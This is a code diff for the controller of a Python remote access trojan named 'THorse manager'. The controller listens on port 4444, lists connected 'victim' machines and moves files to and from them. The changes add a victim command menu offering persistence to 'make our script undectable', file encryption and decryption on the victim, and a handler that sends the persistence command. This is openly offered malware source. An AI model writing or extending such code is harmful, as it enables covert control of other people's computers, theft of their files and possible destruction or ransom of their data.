@@ -1,6 +1,7 @@
 from distutils.command.upload import upload
 import socket
 from Utilities.Logging.log import Log
+from Utilities.Encryption.rsa import encrypt, decrypt
 from threading import Thread
 import json
 import pyfiglet
@@ -46,6 +47,13 @@ def download_file(file_name,target):
     f.close()
 
 
+def client_help():
+    a = ['home', 'upload', 'download', 'add persistance', 'help', 'encrypt', 'decrypt']
+    b = ['Switch to home panel', "upload [filename to upload]", "download [filename to download]",'make our script undectable', "displays all commands", 'encrypt [filename]', 'decrypt [filename]']
+    Log.info("Available commands are :")
+    for i in range(len(a)):
+        print(f'\t[{i+1}]: {a[i]} - {b[i]}')
+    print()
 class victim:
 
     def use(self,args):
@@ -64,6 +72,12 @@ class victim:
                 elif args[0] == 'download':
                     print('downloading..')
                     download_file(args[1],conn)
+                elif cmd == 'add persistance':
+                    conn.send(cmd.encode())
+                elif cmd == 'help':
+                    client_help()
+                elif args[0] == 'encrypt':
+                    pass
                 else:
                     print(reliable_recv(conn))
             except Exception:
@@ -85,8 +99,7 @@ class victim:
     def help(self):
         Log.info('Available commads: ')
         print('\t [1] show devices -> displays all the available devices.')
-        print('\t [2] home ->switch to home panel.')
-        print('\t [3] use [N] ->switch to Nth connection.')
+        print('\t [2] use [N] ->switch to Nth connection.')
         print()
         self.home()
 
@@ -132,9 +145,10 @@ if __name__ == "__main__":
     #     print ("\tpython master.py [HOST] [PORT]")
     #     exit(1)
     Log.success(f"Server started at {socket.gethostbyname(socket.gethostname())}:4444")
-    Log.success(pyfiglet.figlet_format('THorse manager'))
+    Log.success(pyfiglet.figlet_format('THorse  Manager'))
     obj = victim()
     t = Thread(target =start)
     t.start()
     t1 = Thread(target = obj.home)
     t1.start()
+    # generateKeys()
